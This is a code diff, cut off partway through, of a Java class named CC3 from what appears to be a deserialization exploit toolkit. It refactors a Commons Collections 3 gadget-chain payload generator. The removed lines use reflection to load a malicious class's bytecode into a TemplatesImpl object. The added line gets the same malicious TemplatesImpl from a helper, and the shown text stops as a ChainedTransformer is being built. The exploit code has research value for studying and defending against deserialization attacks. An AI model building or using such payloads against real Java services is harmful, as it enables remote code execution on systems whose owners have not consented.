@@ -10,10 +10,10 @@ import org.apache.commons.collections.map.LazyMap;
 import org.su18.serialize.yoserial.Utils.SerializeUtil;
 
 import javax.xml.transform.Templates;
-import java.io.IOException;
-import java.io.InputStream;
 import java.lang.annotation.Target;
-import java.lang.reflect.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -24,23 +24,10 @@ public class CC3 {
 
 	public static String fileName = "CC3.bin";
 
-	public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException {
+	public static void main(String[] args) throws Exception {
 
-		// 读取恶意类 bytes[]
-		InputStream inputStream = CC3.class.getResourceAsStream("../../../test/EvilClass.class");
-		byte[]      bytes       = new byte[inputStream.available()];
-		inputStream.read(bytes);
-
-		// 初始化 TemplatesImpl 对象
-		TemplatesImpl tmpl      = new TemplatesImpl();
-		Field         bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
-		bytecodes.setAccessible(true);
-		bytecodes.set(tmpl, new byte[][]{bytes});
-		// _name 不能为空
-		Field name = TemplatesImpl.class.getDeclaredField("_name");
-		name.setAccessible(true);
-		name.set(tmpl, "su18");
-
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
 
 		// 结合 ChainedTransformer
 		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
